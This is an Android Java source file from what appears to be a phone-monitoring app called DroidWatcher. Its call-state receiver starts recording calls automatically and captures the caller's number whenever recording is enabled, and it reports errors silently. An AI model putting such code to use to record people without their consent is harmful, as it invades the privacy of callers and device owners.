package com.droidwatcher.receivers;

import org.acra.ACRA;

import com.droidwatcher.Debug;
import com.droidwatcher.SettingsManager;
import com.droidwatcher.modules.RecorderModule;
import com.droidwatcher.services.AppService;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Message;
import android.telephony.TelephonyManager;

public class CallReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(final Context context, Intent intent) { 		
        try {
        	SettingsManager settings = new SettingsManager(context);
			if (!settings.isConnected()){
				return;
			}
			
			context.startService(new Intent(context, AppService.class));
			
			int state = -1;
			String extraState = intent.getStringExtra("state");
			
			if (extraState != null && extraState.length() > 0) {
				if (extraState.equals("IDLE")) {
					state = TelephonyManager.CALL_STATE_IDLE;
				}
				else{
					if (extraState.equals("OFFHOOK")) {
						state = TelephonyManager.CALL_STATE_OFFHOOK;
					}
					else{
						if (extraState.equals("RINGING")) {
							state = TelephonyManager.CALL_STATE_RINGING;
						}
					}
				}
			}
			
			if (state == -1) {
				TelephonyManager telephony = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
				if (telephony != null) {
					state = telephony.getCallState();
				}
			}
			
			switch(state){
				case TelephonyManager.CALL_STATE_IDLE:
					Debug.i("[CallReceiver] CALL_STATE_IDLE");
					
					Message msg = Message.obtain();
					msg.what = RecorderModule.STOP_RECORD_CALL;
					RecorderModule.message(msg);
					
					if (AppService.sThreadManager != null) {
						AppService.sThreadManager.onCallChange();
					}
				break;
				case TelephonyManager.CALL_STATE_OFFHOOK:
					Debug.i("[CallReceiver] CALL_STATE_OFFHOOK");
					
					if (settings.isRecordEnabled()) {
						startRecord(intent);
					}
				break;  
				case TelephonyManager.CALL_STATE_RINGING:
					Debug.i("[CallReceiver] CALL_STATE_RINGING");
					
					if (settings.isRecordEnabled()) {
						startRecord(intent);
					}
				break;  
			}
			
		} catch (Exception e) {
			ACRA.getErrorReporter().handleSilentException(e);
		}
	}
	
	private void startRecord(Intent intent){
		String num = intent.getExtras().getString("incoming_number");
		if (num == null){
			num = OutgoingCallReceiver.getOutgoingNumber();
		}
		Message msg = Message.obtain();
		msg.what = RecorderModule.START_RECORD_CALL;
		msg.obj = num;
		RecorderModule.message(msg);
	}
}
